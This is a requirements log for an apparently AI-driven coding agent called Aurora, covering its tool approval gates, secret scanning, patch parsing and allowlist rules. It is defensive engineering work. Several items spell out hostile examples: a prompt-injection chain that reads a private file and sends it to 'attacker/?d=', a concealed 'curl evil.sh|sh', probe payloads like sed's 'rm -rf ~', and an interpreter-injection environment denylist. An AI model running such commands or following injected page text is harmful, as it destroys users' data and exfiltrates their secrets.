# Aurora — Requirements: Tools, edits & approvals

Model tools (edit, patch, run_command, web_fetch, find_files), approval gates, interpreters, extensions, MCP, git/commit.
Part of the index in [`../REQUIREMENTS.md`](../REQUIREMENTS.md); numbers are shared across all files.

2. **R227 — a colliding extension tool name resolves first-wins on BOTH
   sides.** `extensions.load()` builds the name→runner map with
   `setdefault`, not `.update()`. `.update()` let the last-loaded extension
   win the runner while `tools.set_extensions()` (which dedupes the spec
   list) keeps the FIRST spec for that name — so a collision paired one
   extension's advertised description and parameters with another's actual
   code. The approval gate and the model's own call decision both key off
   the spec a name is shown with, so running different code under it breaks
   that invariant with no sign beyond a generic "duplicate skipped" warning.

5. **R230 — `/commit`'s staging step fails as a message, not a traceback.**
   `gitcommit.stage_all` is the only mutating call in the `/commit` flow.
   It ran with `check=True` and its call site caught nothing, so an ordinary
   git failure — a stale `index.lock` left by a crashed git, an unreadable
   path, a timeout on a large tree — raised `CalledProcessError` out of the
   slash command. It must instead raise `gitcommit.GitError` carrying git's
   own stderr, and `/commit` must catch that and abort with a printed
   reason rather than drafting a message and committing an index that was
   never staged. `GitError` was declared in the module but raised nowhere;
   this is what it is for.

6. **R231 — the timestamp exemption must verify a date.** The entropy
   fallback in `secrets.scan` skips tokens that look like dated filenames
   (`20260710_211200_…`). That guard must constrain the field ranges —
   century, month `01`–`12`, day `01`–`31` — not merely ask whether the
   token starts with eight digits. The loose form exempted any
   numerically-prefixed token (`99999999aB3xY7q…`, month 99, day 99) from
   the entropy pass entirely, which is a false NEGATIVE in a secret
   detector: the value is sent to the provider with no challenge at all,
   whereas a false positive only costs a prompt. Real dated filenames must
   keep being exempted.

11. **R236 — `patch.parse` ends a hunk body only at a real file header.**
   A hunk body line is content, whatever it starts with. Ending the body at
   any line starting with `---`/`+++` misreads the removal of a `---` line
   (rendered `----`) or the addition of a `++` line (rendered `+++`) as a
   new file section, truncating the hunk and discarding the rest of it. That
   broke the module's central all-or-nothing guarantee two ways, both
   reporting success: a deletion-only hunk collapsed to pure context and
   applied nothing, and a mixed hunk applied its earlier edits while
   silently dropping everything after the `---`. `---`/`+++` lines are
   markdown horizontal rules and YAML front-matter delimiters, so this is
   reachable on ordinary documents. A file header is recognised as the PAIR
   `--- <path>` followed by `+++ <path>` (marker then a space), or a
   `diff ...` section line — never a bare prefix match. Multi-file
   `diff -u` output keeps parsing into separate hunks, and `git diff`
   output with `diff --git`/`index` lines now parses too, which the prefix
   check rejected outright.

13. **R238 — an extension tool spec with no runner is skipped, loudly.**
    `tools.set_extensions` must drop any spec whose name has no entry in
    `runners`, with a warning, exactly as it already drops a nameless one.
    Keeping it advertises a tool to the model that `run_tool` answers with
    `[error: unknown tool '<name>']` on every call — "advertised and
    permanently uncallable", the precise failure the nameless-spec guard was
    added for, reached through a different door and with no warning at all.
    The model can burn its whole iteration budget retrying. This is ordinary
    in a hand-written extension (a tool renamed in `SPEC` but not in
    `RUNNERS`, a typo in a `RUNNERS` key), and `discover()` merges static and
    `register()`-supplied tools before this runs, so requiring the pair rules
    out no legitimate arrangement. Only the unpaired spec is dropped — one
    typo must not disable an extension's other tools. Relatedly,
    `extensions.scaffold` writes through `write_text_atomic`: R207's comment
    named the truncation risk but fixed only the encoding half.

14. **R239 — every interpreter code-injection variable is stripped from an
    MCP child's environment.** `mcp._ENV_DENYLIST` exists because a server's
    `env:` block is hand-edited YAML and these names are not identity or
    secrets but *code execution* in the child. The list must therefore cover
    both the path and the option variable of each interpreter family:
    `PYTHONPATH`/`PYTHONHOME`/`PYTHONEXECUTABLE`, `PERL5LIB`/`PERL5OPT`/
    `PERLLIB`, `RUBYOPT`/`RUBYLIB`, `CLASSPATH`/`JAVA_TOOL_OPTIONS`/
    `_JAVA_OPTIONS`/`JDK_JAVA_OPTIONS`, alongside the loader and shell
    entries already present. It previously listed Perl's path variable and
    Ruby's option variable but only one of each pair, and for Python only
    `PYTHONSTARTUP` — which Python reads in INTERACTIVE mode only, so it has
    no effect on a spawned server, while `PYTHONPATH`, which prepends to
    `sys.path` and runs a shadowing module at import time before the
    server's first line, was absent. A stdio MCP server is very often a
    Python process; this repo's own `agentic_context_mcp` entry runs one.
    Stripping stays unconditional (never allowlist-filtered), so a typo
    cannot reintroduce one, and an ordinary configured variable such as
    `GITHUB_TOKEN` must still reach the child.

17. **R242 — a versioned interpreter name is the same command.**
    `approve._is_dangerous` tests each token's basename against
    `DANGEROUS_COMMANDS` by exact match, so it must also test the name with
    a trailing version suffix stripped (`python3.11`→`python`, `pip3`→`pip`,
    `perl5.36`→`perl`, `node20`→`node`). Without it, `python3` was
    recognised and `python3.11` — the standard binary name on most Linux
    distributions and Homebrew — was not, which reopened R149's bug on the
    entry R149 itself calls worst ("interpreters: the ARGS are the program,
    so no prefix of them is safe"): approving a harmless
    `python3.11 -c "print(1)"` stored the two-token rule `python3.11 -c`
    and thereafter auto-approved `python3.11 -c "<anything>"` with no
    prompt, permanently. Verified end to end before and after. The exact
    command the user approved must still auto-approve, and ordinary
    commands (`gcc-13`, `sha256sum`, `base64`) must not be swept in — the
    strip only matters when the stripped stem is itself in
    `DANGEROUS_COMMANDS`, and over-triggering costs only a re-prompt.

18. **R243 — the ungated lint fallback writes nothing.** `lint_check` is not
    in `tools.NEEDS_APPROVAL` and is not an `mcp_*` name, so
    `tools.needs_approval` returns False and it runs with no approval
    prompt. Its no-ruff fallback must therefore do a genuinely read-only
    syntax check — the built-in `compile()` on the file's source, in
    process. It previously shelled out to `python -m py_compile`, which
    writes `__pycache__/<name>.cpython-XY.pyc` beside the source as a side
    effect: a tool the user never approved created files in their tree,
    dirtying a clean repo and failing outright against a read-only
    directory. The in-process form also removes an interpreter spawn per
    call, and must still report a real syntax error with its line number.

19. **R244 — MCP server `command`/`args` expand `~` and `$VARS`.**
    `config.yaml` is tracked in git and shared across machines with
    different home layouts (e.g. macOS `~/Desktop/the dev repo/...` vs Linux
    `~/projects/...`), but `MCPManager` passed `command`/`args`
    straight to `Popen`, which does no shell-style expansion — a literal
    absolute path in the config only ever worked on the machine it was
    written on, and broke silently (logged error, not a crash) the moment
    the file was pulled onto the other machine. `command` and each entry
    in `args` must now be run through `os.path.expanduser` and
    `os.path.expandvars` before spawning, so config.yaml can use `~` and
    env vars and stay valid on both machines.

20. **R245 — a long `run_command`/a busy turn must not block asking "is it
    done yet?".** Two related gaps, both from the same root cause: exactly
    one thing runs at a time in Aurora (the model's own tool call blocks
    the whole turn; the TUI's `_worker` is the sole consumer of its one
    inbox, so a `!` command typed while it's busy just queues behind it).
    - `run_command` takes `background: bool` — when true it launches the
      command detached (same process-group ownership as the foreground
      path) and returns a job id immediately instead of blocking until
      exit. `check_command(job_id)` (no approval needed, read-only) polls
      a background job's status and recent output, `tail`-bounded; with no
      `job_id` it lists every known job. Capped at `MAX_BACKGROUND_JOBS`
      concurrent jobs; any still running at process exit are killed
      (atexit), not left orphaned. This lets the MODEL answer "is it
      downloading?" as an ordinary new turn instead of that question
      having to wait behind the download's own blocking tool call.
    - The TUI gained a second queue + worker (`_side_inbox`/`_side_worker`)
      that only `!` bash commands submitted while the main worker is busy
      route to — they run CONCURRENTLY with whatever the main worker is
      doing, instead of queuing behind it. `cd`/`clear` are refused there
      (not silently, not by racing `self._bash_cwd`/the scrollback against
      the main worker) since the two threads share that state with no
      lock between them; anything read-only (`tail`, `ps`, checking a
      download's progress) runs normally. This lets the HUMAN check on
      something themselves without waiting on the model's own turn.

22. **R247 — Aurora can use plain-Markdown "doc skills" (Claude Code-shaped
    SKILL.md), not just its own executable ones.** `/name` already ran an
    executable or `.py` skill (R11); it now also resolves against any
    `SKILL.md` (frontmatter `name:`/`description:` + prose) found under the
    directories the user names in config.yaml's `doc_skill_roots:` list — a
    plain YAML list, as many paths as wanted, no default. Unlike an
    executable skill there is nothing to subprocess: the body is fed to the
    model as a real, tool-enabled turn via `_run_turn` — the exact mechanism
    `/bootstrap` already uses to turn a saved file into a prompt, not a new
    one. `/skills` lists both kinds together, doc skills marked `[doc]`; an
    executable skill wins a name collision, same shadowing rule `discover()`
    already applies between its own two search dirs.

    **No path is ever assumed.** `doc_skill_roots:` absent or empty means no
    doc skills — Aurora is not tied to any one machine's layout, so nothing
    in `aurora/skills.py` names a path. This machine's own two libraries
    (any directory listed under `doc_skill_roots`) are
    data in this repo's own `config.yaml`, alongside the other machine-
    specific values already there (`base_url`, the `mcp_servers` path) — not
    a constant in the source.

    **Two real bugs found and fixed while building this, both proven against
    the actual skill corpus, not hypothetical:**
    - `Path.rglob` does not follow a symlinked category directory (this
      machine's own `SKILLS/{analysis,meta,writing}` all are, pointing into
      a separate skills repo). `recurse_symlinks` only exists on 3.11's
      `rglob` from Python 3.13, and this project supports 3.11+, so it
      can't be relied on portably either way. Measured: `rglob` found 1 of
      6 real `SKILL.md` files under this repo's own SKILLS root, the other 5
      silently absent, no error. Fixed with `os.walk(..., followlinks=True)`,
      which also degrades on an unreadable directory for free (`onerror`
      defaults to ignoring `OSError`, unlike `rglob` which raises).
    - A `description:` whose prose contains its own bare `word: word` is
      invalid strict YAML (an unquoted colon+space ends a plain scalar) and
      is common in the real corpus, not a one-off typo — confirmed on
      `agentic-context-bootstrap`'s actual live file
      ("...a topic: SOUL.md's machine brief...")
      , which came back with **no** description under a strict-only parser.
      `_parse_frontmatter` now falls back to a lenient line-by-line
      `key: value` extractor (splitting only the first colon) when strict
      YAML fails, recovering exactly the two fields this module reads
      (`name`, `description`) without attempting to be a real YAML parser.

    **Test:** `tests/test_skills.py` — discovery from an unconfigured/empty/
    nonexistent root returns nothing (never a guessed path); a nested
    `SKILL.md` found recursively; earlier-root shadowing; survival of an
    unreadable root; frontmatter stripped from the body, including the
    embedded-colon regression case above; unknown name returns `None`;
    `/skills` listing shows both kinds with `[doc]` marking the prose ones;
    an executable skill shadows a doc skill of the same name. Full suite
    (1273 tests) re-run clean after the change.

32. **R262 — `/auto-approve on|off` skips the approval prompt for the
    session.** Feature request: on a long tool-heavy turn, approving one
    gated call after another gets tiring. `/auto-approve on` makes every
    call that would normally stop and ask run unprompted instead — same as
    picking "Yes" at every gate yourself — logged under its own
    `auto_approved` decision (a new `AgentCallbacks.auto_approve` callable,
    polled fresh per gated call, not a snapshot at turn start, so toggling
    mid-turn takes effect on the very next call) so the session log still
    shows WHY nobody was asked, distinct from an ordinary allowlist hit.
    Two things it deliberately does NOT bypass: a `/denylist` rule still
    blocks its call outright (checked and `continue`d past, unconditionally
    of auto-approve, same "deny always wins" design as R120), and a
    detected secret still stops and asks separately (`secret_challenge` is
    an unrelated gate).
    Session-only, NOT persisted to `runtime.yaml` — unlike `/fallback` and
    `/multiline`, a standing config-file bypass of the approval gate is a
    much bigger foot-gun than a toggle that always starts back off on a
    fresh run. While it's on, the TUI status bar carries a persistent `⚠
    auto-approve ON` tag — the whole point of the session-only default is
    that this is meant to be a temporary "stop nagging me for this task"
    switch, not a standing preference, and a toggle with no visible
    reminder is exactly how it gets left on into an unrelated, riskier
    request.

    **Test:** `test_auto_approve_skips_the_prompt_and_logs_its_own_decision`,
    `test_auto_approve_never_overrides_a_denylist_rule`,
    `test_auto_approve_command_toggles_and_reports_status`,
    `test_auto_approve_is_session_only_not_persisted`,
    `test_status_bar_warns_while_auto_approve_is_on`.

35. **R265 — a secret "stop" on a write argument closes the turn validly.**
   `agent.run_turn`'s write-argument scan (write_file/edit_file/apply_patch)
   returned on "stop" without recording anything, unlike the reply-scan stop
   (P-1). On a first round that left history ending on the user message, so
   the next send stacked two user turns, and the requested calls never
   reached `on_tool_result`. It now reports each call as skipped, drops the
   tool calls, and appends a tool-call-free assistant message (a placeholder
   when the reply had no text). The secret never enters history.

   **Test:** `tests/test_deepdive_regressions.py::test_write_arg_secret_stop_leaves_a_closed_valid_history`.

38. **R268 — tool arguments must be a JSON object.** `openai_compat.turn` only
   checked that a tool call's arguments parsed as JSON. A list, string,
   number or `null` became `ToolCall.arguments` and raised `AttributeError`
   in the agent loop AFTER the assistant `tool_calls` message was appended,
   so history kept an orphaned tool_call that every later request sent (and
   `Engine.send` only cleans up a dangling USER message). A non-object now
   raises `MalformedToolCall` and takes R5's retry-then-degrade path.

   **Test:** `test_non_object_tool_arguments_raise_malformed` (list/string/
   number/null), `test_run_turn_degrades_instead_of_orphaning_a_tool_call`.

39. **R269 — model edits keep a file's line endings.** `edit_file` and
   `apply_patch` read with `read_text` (universal newlines) and wrote in text
   mode, so one edit rewrote every CRLF in a Windows-style file as LF: a
   whole-file diff and a silent line-ending change. A uniformly-CRLF file is
   now edited in LF form (so a model's LF-joined `old` and hunks still
   match) and written back as CRLF. Any other file (LF or mixed) is read and
   written byte-faithfully: `paths.write_text_preserving` writes with
   `newline=""`.

   **Test:** `test_edit_file_keeps_crlf_line_endings`,
   `test_apply_patch_keeps_crlf_line_endings`,
   `test_edit_file_leaves_lf_and_mixed_files_byte_faithful`.

40. **R270 — `edit_file` refuses an empty `old`.** `text.count("")` is
   `len(text) + 1`, so `replace_all=true` with `old=""` inserted `new`
   between every character of the file (`abc` → `XaXbXcX`). It now returns
   an `[error: ...]` pointing at `write_file`, and the file is untouched.

   **Test:** `test_edit_file_rejects_empty_old` (with and without replace_all).

41. **R271 — model-run commands never inherit the terminal's stdin.**
   `_run_command_once` and `_start_background` spawned with no `stdin`, so
   a command inherited the TUI's own terminal, which prompt_toolkit holds in
   raw mode. Anything that reads stdin (a REPL, a y/N prompt, `git commit`
   without `-m`, `head`) fought the TUI for keystrokes or blocked until
   COMMAND_TIMEOUT (300s). Both now use `stdin=DEVNULL`: EOF is the honest
   answer, since nobody can type there.

   **Test:** `test_a_stdin_reading_command_gets_eof_not_a_hang`,
   `test_background_job_stdin_is_not_inherited` (fd 0 swapped for an open,
   silent pipe; pytest's own fd 0 hides the bug).

43. **R273 — a gated call with no target path invalidates the per-file undo
   snapshot.** `rewind.clear_last_mutation()` existed so that "the last
   mutation" could not outlive a later, differently-shaped one, but nothing
   called it. The engine's checkpoint callback only ever took a snapshot
   (when args had `path`). After `edit_file(A)` followed by any
   `run_command`, `/undo` still offered, and reverted, A's older edit while
   the real last change was ignored. That is the exact "undo reverted the
   wrong thing" incident `undo_preview` documents. A pathless gated call
   (`run_command`, `wait_until`, `cancel_command`, `mcp_*`) now clears the
   snapshot.

   **Test:** `test_undo_never_reverts_an_older_edit_after_a_command`.

47. **R277 — "always allow" never generalizes over a command's payload.** The
   two-token rule stores the command plus its first argument. For these
   commands that first argument is the harmless half and the payload
   varies freely. Verified before the fix, each probe auto-approved with no
   prompt: `sed -i s/a/b/ f` stored `sed -i` and then approved
   `sed -i '1e rm -rf ~' ~/.bashrc` (GNU sed's `e` runs a command);
   `git -c color.ui=false status` stored `git -c` and then approved
   `git -c core.sshCommand=… fetch`; also `tar -xf evil.tar -C /`,
   `rsync -a --delete / x` and `uv run evil.py`. `DANGEROUS_COMMANDS` gains
   editors/stream processors (sed, awk, ex, vim, ed), archivers/copiers
   (tar, unzip, rsync, scp, sftp, ssh), runners (uv, uvx, pipx, poetry,
   pdm, hatch, conda, go, deno, bun, php, lua, java, Rscript, xargs, env,
   nohup, timeout, nice, watch, crontab, at) and killers (kill, pkill,
   killall), which makes their rules exact-match only. `git` keeps prefix
   generalization unless a token is `-c`/`--config-env`/`--exec-path`.

   **Test:** `test_always_allow_does_not_generalize_payload_commands` (10
   approved/probe pairs), `test_plain_git_subcommands_still_generalize`.

51. **R281 — an `apply_patch` hunk anchors on whole lines only.**
   `patch.apply` located a hunk's context+removed lines with a raw substring
   count and `str.replace`. A hunk could anchor in the middle of an
   unrelated line and edit it while reporting success, and a whole-line
   match could be rejected as "matches 2 times" because of a substring
   elsewhere. Verified: `-count = 5 / +count = 6` turned `total_count = 5`
   into `total_count = 6`. A match now counts only if it starts at a line
   start and ends at a line end. The approval preview uses the same
   function, so preview and result still agree.

   **Test:** `test_patch_never_anchors_inside_a_line` (3 cases, including a
   multi-line match straddling line ends),
   `test_patch_counts_only_whole_line_matches_for_uniqueness`.

52. **R282 — `web_fetch` strips script/style blocks in linear time.** The
   strip was `re.sub(r"<(script|style)[\s\S]*?</\1>", …)`. On an opener with
   no closer the lazy scan runs to the end of the text, and it is retried
   from every later opener, which is quadratic. Measured: 224KB of unclosed
   `<script` took 33.7s, and the fetch cap is 2MB, on an ungated,
   PARALLEL_SAFE tool that Esc could not interrupt. `_strip_script_style`
   is one forward pass: every search starts where the last one ended. An
   unclosed block swallows the rest of the page, as a browser would. Proper
   pairs strip exactly as before, case-insensitive, `</script >` included.

   **Test:** `test_script_strip_is_linear_on_unclosed_tags` (2.1MB, <1s),
   `test_web_fetch_end_to_end_is_fast_on_hostile_html` (35.5s → failing
   before the fix), `test_script_strip_matches_the_old_behaviour`.

53. **R283 — `web_fetch` asks before reaching a private host or sending a query
   string.** `web_fetch` and `read_file` were both ungated, so injected text
   in a fetched page could chain `read_file(<private file>)` →
   `web_fetch("https://attacker/?d=<contents>")`, or read an internal
   service (a LAN admin UI, `127.0.0.1:9512`, `169.254.169.254`), with no
   prompt at all. `tools.needs_approval(name, args)` now gates a fetch whose
   URL targets a non-public host (loopback, private, link-local, reserved,
   `localhost`/`.local`/`.ts.net`/`.internal`/`.lan`/`.home`, or a name
   resolving to one of those), carries a query string, or isn't http(s). A
   plain public page still runs with no prompt. A gated fetch is never
   prefetched by the R94 parallel batch. Redirects are followed manually,
   one hop at a time, and a public URL redirecting to a private host is
   blocked. "Always allow" stores the origin (`scheme://host:port/*`) and
   matches it exactly, never a bare `*`. The approval prompt shows the URL
   and why it asked. The mutation checkpoint still asks by name alone, so a
   fetch takes no checkpoint.

   **Test:** `test_url_needs_approval_policy` (10 URLs),
   `test_private_fetch_is_gated_and_never_prefetched`,
   `test_redirect_from_public_to_private_is_blocked`,
   `test_always_allow_web_fetch_is_scoped_to_one_origin`.

54. **R284 — `/commit`'s draft request passes the R58 secret gate.** The
   staged diff (up to `_DRAFT_DIFF_CAP`, 20KB) went to the provider through
   `side_completion` with no scan, while every other path that sends new
   content to the model scans first (prompt, tool output, quick_ask per
   R254g). Staging a `.env` and running `/commit` sent its token
   unchallenged. The diff is now scanned exactly as it would be sent.
   "stop" drafts nothing (the user types the message), "redact" sends the
   redacted diff, "keep"/"always" behave as everywhere else.

   **Test:** `test_commit_draft_is_secret_scanned` (stop/redact/keep).

55. **R285 — `/commit` reads git output as UTF-8 with replacement.**
   `gitcommit._git` used `text=True`, i.e. the strict locale codec. A staged
   latin-1 file (or any non-ASCII under `LANG=C`) raised
   `UnicodeDecodeError` out of the unguarded `staged_diff`/`unstaged_summary`
   and killed `/commit` with a raw exception. Now `encoding="utf-8",
   errors="replace"`.

   **Test:** `test_commit_handles_a_non_utf8_staged_diff`.

57. **R287 — nothing shown at the approval gate can hide part of itself.** The
   approval prompt printed model-authored commands, `then:` follow-ups,
   paths, URLs, MCP arguments and the diff preview with their raw control
   sequences. `strip_dangerous_escapes` removes only OSC/DCS/APC/PM/SOS and
   keeps SGR for colour. Verified in the TUI render path: `ls -la\x1b[8m;
   curl evil.sh|sh` showed as `$ ls -la`, because SGR 8 conceals the rest,
   so the user approved something other than what ran. `colors.visible()`
   now renders every C0/C1 control, DEL and Unicode bidi/zero-width
   character as a literal `\x1b`/`‮` escape. Newlines, tabs and
   ordinary Unicode text are untouched. It is applied to everything the
   approval prompt prints (the diff before Aurora's own colouring) and to
   the tool-start argument echo.

   **Test:** `test_approval_prompt_shows_control_chars_literally` (SGR-8
   command, `then:`, RLO filename, MCP arg), `test_diff_preview_cannot_hide_added_lines`,
   `test_visible_keeps_newlines_tabs_and_unicode_text`.

62. **R292 — `find_files` is bounded in time and cancellable.** Unlike `grep`
   (GREP_TIMEOUT), it walked with no limit. Measured: 19.7s over 812k
   entries under `~`, unbounded on a larger tree or a network mount, on the
   worker thread, and Esc could not stop it. It now stops at `FIND_TIMEOUT`
   (30s) or when the turn's cancel fires (it joined `run_tool`'s cancellable
   set), checked once per directory, and returns the partial results with a
   `[search … — results are PARTIAL]` marker.

   **Test:** `test_find_files_stops_at_its_deadline`,
   `test_find_files_honours_cancel`, `test_find_files_normal_result_unchanged`.

71. **R309 — a failed `edit_file` says why `old` missed.** The bare "text not
   found" made the model guess again. The error now appends a hint when one
   applies: found with different leading/trailing whitespace, found with
   different indentation/spacing (tabs vs spaces), or the first line exists
   but a later one differs. "First line exists" needs the stripped first line
   to equal exactly ONE whole line of the file (a `}` or `else:` on many
   lines, or a substring of a longer line, gives no hint). No hint when
   nothing is close. The check runs on
   the CRLF-normalised text (R269), and the file is untouched on failure.
   `apply_patch` hunk misses get the same hints (shared `patch.not_found_hint`),
   plus "the text exists, but only inside a longer line" for an R281 rejection.
   Idea taken from Green-Agent's `_not_found_hint` (card
   20261004-204633-eval-green-agent-for-aurora-ideas).

   **Test:** `tests/test_edit_hints_and_output.py`.

72. **R310 — command output keeps its head AND its tail.** A head-only cap
   dropped the end of a long test/build run, where the failure summary is.
   Capture keeps the first and last half of `COMMAND_OUTPUT_CAP` per stream
   (memory still bounded, pipe still drained — R153/R194), with a
   `[... N bytes omitted ...]` marker between. `run_command` and
   `wait_until` additionally return at most `COMMAND_RESULT_LIMIT` (50k
   chars: 25k head + 25k tail) to the model, so a noisy command costs at most
   ~15k tokens of context. The limit holds on every path that returns output
   to the model: normal exit, timeout (the classic runaway), cancel, and
   skill scripts (`skills.run`).

   **Test:** `tests/test_edit_hints_and_output.py`.


73. **R319 — "always allow" never stores the harmless half of a payload.**
    A rule is the first two tokens, so a flag or a database/interpreter name as
    the second token left the payload free: `sort -o` → `sort -o ~/.bashrc`,
    `psql -c`/`mysql -e` → any SQL, `sqlite3 app.db` → `'.shell id'`,
    `tcsh -c` → any script, `git -C ../lib status` → `git -C / clean -fdx`,
    `git config user.name` → `git config alias.x '!cmd'` / `core.fsmonitor`.
    Now: a non-safe command whose second token is a flag is stored whole
    (exact-only); `sqlite3 psql mysql mariadb mongosh redis-cli csh tcsh pwsh
    tclsh wish expect julia swift irb luajit groovy scala kotlin dotnet sort nc
    ncat socat telnet ftp` join `DANGEROUS_COMMANDS`; `git` with
    `-C/--git-dir/--work-tree/--namespace` or a `config`/`alias` subcommand is
    dangerous, which also makes rules already stored as `git -C` / `git config`
    inert at match time.

    **Test:** `tests/test_deepdive_20261022.py` (R319 group).

74. **R320 — `web_fetch` decides "private" the same way its approval gate does.**
    The gate checked the host without DNS (R300) while the fetch re-checked it
    with DNS and treated a hit as "the user approved a private target", which
    disabled the rebinding and redirect guards. Any host the gate missed
    (`127.1`, `2130706433`, a bare VPN name like `myhost`) was fetched
    unprompted. Now `_private_host` also recognises shorthand/decimal/hex IPv4
    and bare single-label names as private (so they prompt), and the fetch's
    `approved_private` is computed with `resolve=False`, so a public-looking
    name that resolves private is blocked by the rebinding guard, not approved.

    **Test:** `tests/test_deepdive_20261022.py` (R320 group).

75. **R321 — a read never runs ahead of an earlier write in the same round.**
    `agent.run_turn` prefetched every `PARALLEL_SAFE` call of a round before
    running any call in order, so `[edit_file a.py, read_file a.py]` returned
    `a.py` as it was BEFORE the edit, and a `list_dir` after a `mkdir` missed the
    new directory. Only the reads that precede the round's first non-read call
    are prefetched; later ones run in order.

    **Test:** `tests/test_deepdive_20261022.py::test_read_after_edit_in_one_round_sees_the_edit`.

76. **R322 — an edit keeps the file's inode.** `write_text_preserving` wrote a
    temp file and `os.replace`d it, so a single file bind-mounted into a
    container (a `Caddyfile`) kept showing the old content, hard links were
    split, and owner/group/xattrs were lost. An EXISTING regular file is now
    rewritten through its own inode: space is reserved first (`posix_fallocate`,
    so ENOSPC raises before anything is touched) and the old bytes are restored
    if the write fails. A new file still goes through the atomic temp+rename.
    Trade-off accepted: a hard kill mid-write can leave the file partly written
    (it could not before); the old bytes are restored on every catchable failure.

    **Test:** `tests/test_deepdive_20261022.py` (R322 group), `tests/test_paths.py`.

77. **R323 — the umask is read, never toggled.** `_umask()` set the
    process-wide umask to 022 and back on every write, so another thread
    creating a file in that window got the wrong mode. It is now read once from
    `/proc/self/status` and cached (set-and-restore remains only as the
    first-call fallback where `/proc` is missing).

    **Test:** `tests/test_deepdive_20261022.py::test_umask_is_read_without_toggling_it`.

78. **R324 — the approval preview is computed the way the tool will write.**
    `diff_preview` read files with universal newlines (`\r\n` and a lone `\r`
    both became `\n`) while `edit_file`/`apply_patch` read byte-faithfully
    (R269), so on a mixed-ending file the approved diff differed from the
    change that landed. It now uses the tools' own reader, and an `edit_file`
    whose `old` is missing, or occurs 2+ times without `replace_all`, previews
    as `[edit will fail: …]` instead of showing a one-place change for a call
    that errors.

    **Test:** `tests/test_deepdive_20261022.py` (R324 group).

79. **R327 — `read_file` pages and tails without scanning decoded lines.**
    Paging re-read the file from line 1 on every page, decoding and counting
    each skipped line (2M-line log: 306 ms at the end, ~3 s per page on 1 GB).
    The skip now counts newlines in 1 MB binary blocks and seeks, and a new
    `tail=<n>` argument returns the last n lines by reading backwards from the
    end (O(n); the header gives the total only when the whole file was reached).
    Line numbers, the "fewer than N lines" message and CRLF/UTF-8 handling are
    unchanged.

    **Test:** `tests/test_deepdive_20261022.py` (R327 group).

80. **R328 — the secret scan skips source code and word-shaped names.** Reading
    Aurora's own `tui.py` raised a keep/redact/stop challenge for
    `double-Esc-within-2s` (high-entropy), `password=Condition(lambda:` and
    `draft_tokens = ""` (env credential). An `Env credential` whose value is an
    empty string, an f/r/b-string, `None/True/False/null` or a call is code and
    is skipped; a candidate token of 3+ `-`/`_`-joined short word-shaped
    segments (`lowercase`, `Capitalized`, `ALLCAPS≤5`, `2s`) is a name and is
    skipped. Bare words, quoted text and mixed-case random tokens still match.

    **Test:** `tests/test_deepdive_20261022.py` (R328 group).

81. **R329 — "keep" on a tool's output is remembered for the session.** The
    same file read twice asked twice. A `keep` answer to a `tool:` challenge now
    adds the matched values' hashes to `Engine.secret_session_keep`, consulted
    only when scanning tool OUTPUT (not prompts, replies or writes) and never
    persisted — unlike "always allow", which still writes to config. (The
    challenge list was already capped at 10 lines with "… and N more", and is
    one decision however many matches, so a 3,598-match blob is one prompt.)

    **Test:** `tests/test_deepdive_20261022.py::test_keep_on_tool_output_is_remembered_for_the_session`.

82. **R334 — "allow for this session" at the approval prompt.** The choice was
    once or forever, so the the server allowlist grew to 343 rules. A new `t` answer
    ("Allow for this session only (not saved)") runs the call and keeps the rule
    in memory (`approve._SESSION_RULES`), built by the same `_rule_for` — so every
    R149/R319 scoping rule applies — and gone when Aurora exits. `/allowlist`
    lists them under "this session only". Logged as `session_allow`.

    **Test:** `tests/test_deepdive_20261022.py` (R334 group).

83. **R335 — the approval prompt shows what "always" would save.** The `a` row
    reads `Always allow this (remember) — saves `git status` (any command
    starting `git status`)`, or `… (exactly this command)` / `(… with any
    arguments)` / `(any page on that site)`, from `approve.rule_scope`.

    **Test:** `tests/test_deepdive_20261022.py::test_rule_scope_describes_the_reach`.

84. **R336 — `/allowlist audit` and `/allowlist prune`.** `approve.audit()` lists
    command rules that are `duplicate`, `legacy` (single non-safe token) or
    `exact-only` (a two-token rule on a command today's classifier would store
    whole: dangerous, compound, or a flag second token). `prune` removes them
    after a y/N; nothing is deleted by `audit`.

    **Test:** `tests/test_deepdive_20261022.py::test_audit_and_prune_find_stale_rules`.

85. **R338 — `web_fetch` returns readable text.** Tags were stripped with a regex,
    so every fetch carried the menu, footer, cookie form and related-links text.
    Now `html_to_text` drops `nav footer aside form noscript svg template iframe`
    (and script/style) in the same linear single pass as R282, prefers the first
    `<main>` or `<article>` body when it has one, keeps block tags as line breaks
    and `<li>` as `- `, decodes entities and collapses blank runs. An
    `application/pdf` response (or `%PDF-` body) returns a one-line "this is a
    PDF" message instead of binary garbage. Non-HTML text types are returned
    as-is.

    **Test:** `tests/test_web_extension.py` (R338 group).

86. **R339 — `/plan on|off` (plan mode).** Approving twenty prompts to see where
    a task is going is the wrong way round. With plan mode on, the agent loop
    refuses every call that `needs_approval` — writes, edits, commands, MCP tools,
    and even ones an allowlist rule or `/auto-approve` would have run — with
    `[plan mode — not run … Put this step in your plan instead.]`, logged as the
    `plan_mode` gate decision. Reads, searches and fetches still run. Session-only
    (off at start), shown as `✎ plan mode` on the status bar.

    **Test:** `tests/test_deepdive_20261022.py` (R339 group).

87. **R340 — `/budget`: spend caps.** OpenRouter spend through Aurora was
    uncapped. `/budget <usd>` caps the session (memory only), `/budget day <usd>`
    caps each calendar day across sessions (`runtime.yaml: daily_budget_usd`,
    totals in `AURORA_HOME/spend.json`, 60 days kept), `off` clears either;
    `/budget` shows both. Both default to off. At 80% of a cap one warning is
    shown; at 100% the round's tool calls are skipped (`[skipped: spend limit
    reached …]`, so history stays valid) and `Engine.send` refuses new messages
    until the cap is raised. Only priced models accrue spend.

    **Test:** `tests/test_deepdive_20261022.py` (R340 group).

## R350 — A repeating model is stopped (2026-10-24)
- Rule: when every tool call of a round repeats the previous round's call with the identical result, for
  `agent.REPEAT_ROUNDS_STOP` (3) rounds in a row, the turn ends with the notice "stopped: the model keeps repeating the
  same call". The repeat nudge compares raw outputs, so it fires on every repeat, not every other one.
- Covered by `tests/test_core.py::test_agent_loop_stops_a_model_that_ignores_the_repeat_nudge`.
